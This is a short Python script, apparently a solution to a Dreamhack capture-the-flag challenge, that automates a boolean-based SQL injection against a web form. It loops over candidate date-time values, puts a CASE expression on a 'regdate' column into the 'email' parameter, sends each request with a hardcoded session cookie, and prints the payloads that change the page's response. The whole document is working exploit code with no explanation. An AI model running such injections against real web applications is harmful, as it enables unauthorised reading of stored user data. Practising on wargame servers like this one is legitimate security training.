import requests

URL = "http://host3.dreamhack.games:21834/home.php"

cookie = {"PHPSESSID":"3bafaf5d0e2f6d2ed138853ca67e4d3a"}

for j in range(12, 14+1):
    for i in range(0, 99+1):
        payload = f"' or case regdate when '20210524' '03{str(j)}{str(i).zfill(2)}' then 1 else 0 end or '" 

        params = {"username":"exploit", "email":payload}

        res = requests.get(URL, params=params, cookies=cookie)

        if "Not Found :(" not in res.text:
            print("-"*10)
            print("FIND!!", payload)
            print(res.text)
            print("-"*10)